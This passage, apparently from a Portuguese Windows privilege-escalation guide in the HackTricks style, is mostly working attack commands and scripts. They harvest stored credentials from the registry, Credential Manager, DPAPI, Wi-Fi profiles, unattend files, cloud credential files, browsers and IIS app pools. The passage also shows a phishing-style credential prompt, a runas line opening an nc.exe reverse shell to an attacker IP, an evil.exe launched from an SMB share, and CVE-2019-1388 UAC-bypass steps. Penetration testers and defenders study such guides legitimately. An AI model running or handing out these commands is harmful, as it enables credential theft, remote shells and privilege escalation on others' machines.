reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gerenciador de Credenciais / Cofre do Windows

De [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Cofre do Windows armazena credenciais de usuário para servidores, sites e outros programas que **Windows** pode **fazer login nos usuários automaticamente**. À primeira vista, isso pode parecer que agora os usuários podem armazenar suas credenciais do Facebook, credenciais do Twitter, credenciais do Gmail etc., para que façam login automaticamente via navegadores. Mas não é bem assim.

O Cofre do Windows armazena credenciais que o Windows pode usar para fazer login nos usuários automaticamente, o que significa que qualquer **aplicativo do Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode fazer uso deste Gerenciador de Credenciais** e do Cofre do Windows e usar as credenciais fornecidas em vez de os usuários digitarem o nome de usuário e a senha o tempo todo.

A menos que os aplicativos interajam com o Gerenciador de Credenciais, não acho que seja possível para eles usarem as credenciais para um determinado recurso. Portanto, se seu aplicativo quiser fazer uso do cofre, ele deve de alguma forma **se comunicar com o gerenciador de credenciais e solicitar as credenciais para esse recurso** do cofre de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então você pode usar `runas` com a opção `/savecred` para usar as credenciais salvas. O seguinte exemplo chama um binário remoto via um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou do [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

A **Data Protection API (DPAPI)** fornece um método para criptografia simétrica de dados, predominantemente utilizado dentro do sistema operacional Windows para a criptografia simétrica de chaves privadas assimétricas. Essa criptografia utiliza um segredo de usuário ou sistema para contribuir significativamente com a entropia.

**A DPAPI permite a criptografia de chaves através de uma chave simétrica que é derivada dos segredos de login do usuário**. Em cenários que envolvem criptografia de sistema, utiliza os segredos de autenticação de domínio do sistema.

As chaves RSA do usuário criptografadas, usando DPAPI, são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde `{SID}` representa o [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) do usuário. **A chave DPAPI, co-localizada com a chave mestra que protege as chaves privadas do usuário no mesmo arquivo**, geralmente consiste em 64 bytes de dados aleatórios. (É importante notar que o acesso a este diretório é restrito, impedindo a listagem de seu conteúdo via o comando `dir` no CMD, embora possa ser listado através do PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **módulo mimikatz** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar o **mimikatz module** `dpapi::cred` com o `/masterkey` apropriado para descriptografar.\
Você pode **extrair muitos DPAPI** **masterkeys** da **memória** com o módulo `sekurlsa::dpapi` (se você for root).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciais do PowerShell

As **credenciais do PowerShell** são frequentemente usadas para **scripting** e tarefas de automação como uma forma de armazenar credenciais criptografadas de maneira conveniente. As credenciais são protegidas usando **DPAPI**, o que geralmente significa que só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **descriptografar** uma credencial PS do arquivo que a contém, você pode fazer:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP Salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos Recentemente Executados
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais do Desktop Remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use o módulo `dpapi::rdg` do **Mimikatz** com o `/masterkey` apropriado para **descriptografar qualquer arquivo .rdg**\
Você pode **extrair muitos masterkeys DPAPI** da memória com o módulo `sekurlsa::dpapi` do Mimikatz

### Sticky Notes

As pessoas costumam usar o aplicativo StickyNotes em estações de trabalho Windows para **salvar senhas** e outras informações, sem perceber que é um arquivo de banco de dados. Este arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurar e examinar.

### AppCmd.exe

**Observe que para recuperar senhas do AppCmd.exe você precisa ser Administrador e executar sob um nível de Alta Integridade.**\
**AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\` .\
Se este arquivo existir, então é possível que algumas **credenciais** tenham sido configuradas e podem ser **recuperadas**.

Este código foi extraído do [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe.\
Instaladores são **executados com privilégios de SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credenciais)

### Credenciais do Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de Host SSH do Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chaves SSH no registro

As chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se você encontrar alguma entrada dentro desse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre essa técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!NOTE]
> Parece que esta técnica não é mais válida. Tentei criar algumas chaves ssh, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação de chave assimétrica.

### Arquivos não atendidos
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar por esses arquivos usando **metasploit**: _post/windows/gather/enum_unattend_

Exemplo de conteúdo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups do SAM e SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais de Nuvem
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure um arquivo chamado **SiteList.xml**

### Senha GPP em Cache

Um recurso estava anteriormente disponível que permitia a implantação de contas de administrador local personalizadas em um grupo de máquinas via Preferências de Política de Grupo (GPP). No entanto, esse método tinha falhas de segurança significativas. Primeiro, os Objetos de Política de Grupo (GPOs), armazenados como arquivos XML no SYSVOL, podiam ser acessados por qualquer usuário do domínio. Em segundo lugar, as senhas dentro desses GPPs, criptografadas com AES256 usando uma chave padrão documentada publicamente, podiam ser descriptografadas por qualquer usuário autenticado. Isso representava um risco sério, pois poderia permitir que usuários obtivessem privilégios elevados.

Para mitigar esse risco, uma função foi desenvolvida para escanear arquivos GPP em cache localmente que contêm um campo "cpassword" que não está vazio. Ao encontrar tal arquivo, a função descriptografa a senha e retorna um objeto PowerShell personalizado. Este objeto inclui detalhes sobre o GPP e a localização do arquivo, ajudando na identificação e remediação dessa vulnerabilidade de segurança.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por esses arquivos:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descriptografar a cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuração do IIS Web
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais do OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Peça credenciais

Você pode sempre **pedir ao usuário para inserir suas credenciais ou até mesmo as credenciais de um usuário diferente** se você achar que ele pode conhecê-las (note que **pedir** diretamente ao cliente as **credenciais** é realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Nomes de arquivos possíveis contendo credenciais**

Arquivos conhecidos que há algum tempo continham **senhas** em **texto claro** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pesquise todos os arquivos propostos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na Lixeira

Você também deve verificar a Lixeira para procurar credenciais dentro dela.

Para **recuperar senhas** salvas por vários programas, você pode usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro do registro

**Outras possíveis chaves de registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extrair chaves openssh do registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico de Navegadores

Você deve verificar bancos de dados onde senhas do **Chrome ou Firefox** estão armazenadas.\
Também verifique o histórico, favoritos e marcadores dos navegadores, pois talvez algumas **senhas estejam** armazenadas lá.

Ferramentas para extrair senhas de navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Sobrescrita de DLL COM**

**Component Object Model (COM)** é uma tecnologia incorporada no sistema operacional Windows que permite a **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado por um ID de classe (CLSID)** e cada componente expõe funcionalidade por meio de uma ou mais interfaces, identificadas por IDs de interface (IIDs).

As classes e interfaces COM são definidas no registro sob **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e **HKEY\_**_**CLASSES\_**_**ROOT\Interface**, respectivamente. Este registro é criado mesclando **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Dentro dos CLSIDs deste registro, você pode encontrar o registro filho **InProcServer32**, que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ou Multi) ou **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basicamente, se você puder **sobrescrever qualquer uma das DLLs** que serão executadas, você poderia **escalar privilégios** se essa DLL for executada por um usuário diferente.

Para aprender como os atacantes usam o COM Hijacking como um mecanismo de persistência, verifique:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Busca Genérica de Senhas em arquivos e registro**

**Pesquisar por conteúdos de arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Procure um arquivo com um determinado nome de arquivo**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registro por nomes de chave e senhas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Ferramentas que buscam por senhas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **é um msf** plugin que eu criei para **executar automaticamente todos os módulos POST do metasploit que buscam por credenciais** dentro da vítima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automaticamente por todos os arquivos contendo senhas mencionados nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair senhas de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca por **sessões**, **nomes de usuário** e **senhas** de várias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine que **um processo executando como SYSTEM abre um novo processo** (`OpenProcess()`) com **acesso total**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com privilégios baixos, mas herdando todos os manipuladores abertos do processo principal**.\
Então, se você tiver **acesso total ao processo de baixo privilégio**, você pode pegar o **manipulador aberto para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para mais informações sobre **como detectar e explorar essa vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de mais manipuladores abertos de processos e threads herdados com diferentes níveis de permissões (não apenas acesso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmentos de memória compartilhada, referidos como **pipes**, permitem a comunicação entre processos e a transferência de dados.

O Windows fornece um recurso chamado **Named Pipes**, permitindo que processos não relacionados compartilhem dados, mesmo através de diferentes redes. Isso se assemelha a uma arquitetura cliente/servidor, com papéis definidos como **servidor de pipe nomeado** e **cliente de pipe nomeado**.

Quando dados são enviados através de um pipe por um **cliente**, o **servidor** que configurou o pipe tem a capacidade de **assumir a identidade** do **cliente**, assumindo que ele tenha os direitos necessários de **SeImpersonate**. Identificar um **processo privilegiado** que se comunica via um pipe que você pode imitar oferece uma oportunidade para **obter privilégios mais altos** ao adotar a identidade desse processo uma vez que ele interaja com o pipe que você estabeleceu. Para instruções sobre como executar tal ataque, guias úteis podem ser encontrados [**aqui**](named-pipe-client-impersonation.md) e [**aqui**](./#from-high-integrity-to-system).

Além disso, a seguinte ferramenta permite **interceptar uma comunicação de pipe nomeado com uma ferramenta como burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Ao obter um shell como um usuário, pode haver tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura as linhas de comando do processo a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Roubo de senhas de processos

## De Usuário de Baixo Privilégio para NT\AUTHORITY SYSTEM (CVE-2019-1388) / Bypass de UAC

Se você tiver acesso à interface gráfica (via console ou RDP) e o UAC estiver habilitado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário não privilegiado.

Isso torna possível escalar privilégios e contornar o UAC ao mesmo tempo com a mesma vulnerabilidade. Além disso, não há necessidade de instalar nada e o binário usado durante o processo é assinado e emitido pela Microsoft.

Alguns dos sistemas afetados são os seguintes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar essa vulnerabilidade, é necessário realizar os seguintes passos:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Você tem todos os arquivos e informações necessários no seguinte repositório do GitHub:

https://github.com/jas502n/CVE-2019-1388

## De Nível de Integridade Médio de Administrador para Alto / Bypass de UAC

Leia isto para **aprender sobre Níveis de Integridade**:

{{#ref}}
integrity-levels.md
{{#endref}}

Então **leia isto para aprender sobre UAC e bypasses de UAC:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **De Alto Nível de Integridade para Sistema**

### **Novo serviço**

Se você já estiver executando um processo de Alto Nível de Integridade, o **passo para SYSTEM** pode ser fácil apenas **criando e executando um novo serviço**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

De um processo de Alta Integridade, você pode tentar **habilitar as entradas de registro AlwaysInstallElevated** e **instalar** um shell reverso usando um _**.msi**_ wrapper.\
[Mais informações sobre as chaves de registro envolvidas e como instalar um pacote _.msi_ aqui.](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Você pode** [**encontrar o código aqui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se você tiver esses privilégios de token (provavelmente você encontrará isso em um processo de Alta Integridade já existente), você poderá **abrir quase qualquer processo** (processos não protegidos) com o privilégio SeDebug, **copiar o token** do processo e criar um **processo arbitrário com esse token**.\
Usar essa técnica geralmente **seleciona qualquer processo em execução como SYSTEM com todos os privilégios de token** (_sim, você pode encontrar processos SYSTEM sem todos os privilégios de token_).\
**Você pode encontrar um** [**exemplo de código executando a técnica proposta aqui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Essa técnica é usada pelo meterpreter para escalar em `getsystem`. A técnica consiste em **criar um pipe e então criar/abusar um serviço para escrever nesse pipe**. Então, o **servidor** que criou o pipe usando o privilégio **`SeImpersonate`** poderá **impersonar o token** do cliente do pipe (o serviço) obtendo privilégios SYSTEM.\
Se você quiser [**saber mais sobre pipes nomeados, você deve ler isso**](./#named-pipe-client-impersonation).\
Se você quiser ler um exemplo de [**como ir de alta integridade para System usando pipes nomeados, você deve ler isso**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

